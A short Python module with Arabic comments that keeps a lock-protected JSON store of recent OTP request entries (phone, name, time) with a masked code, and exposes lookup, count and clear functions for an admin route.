import os
import json
import threading
from datetime import datetime, timezone

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ADMIN_FILE = os.path.join(BASE_DIR, "otp_requests.json")

_lock = threading.Lock()

def _load():
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return data if isinstance(data, list) else []
    except:
        pass
    return []

def _save(data):
    try:
        tmp = ADMIN_FILE + ".tmp"
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        os.replace(tmp, ADMIN_FILE)
        try:
            os.chmod(ADMIN_FILE, 0o600)
        except:
            pass
    except Exception as e:
        print(f"Admin store save error: {e}")

def add_otp_request(phone, otp="******", name="عميل"):
    with _lock:
        data = _load()
        data = [d for d in data if d.get('phone') != str(phone)]
        data = data[-99:]
        data.append({
            "phone": str(phone),
            "otp": "******",
            "name": name,
            "time": datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S'),
            "timestamp": datetime.now(timezone.utc).timestamp()
        })
        _save(data)
    return True

def get_all_requests():
    with _lock:
        data = _load()
        now = datetime.now(timezone.utc).timestamp()
        valid = []
        for d in data:
            if now - d.get('timestamp', 0) < 10 * 60:
                valid.append(d)
        valid.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
        return valid

# الاسماء اللي routes.py بيدور عليها - عشان ميحصلش خطأ
def get_otp_requests():
    return get_all_requests()

get_requests = get_all_requests
get_pending_requests = get_all_requests
get_otp_codes = get_all_requests

def get_pending_count():
    return len(get_all_requests())

def clear_all():
    _save([])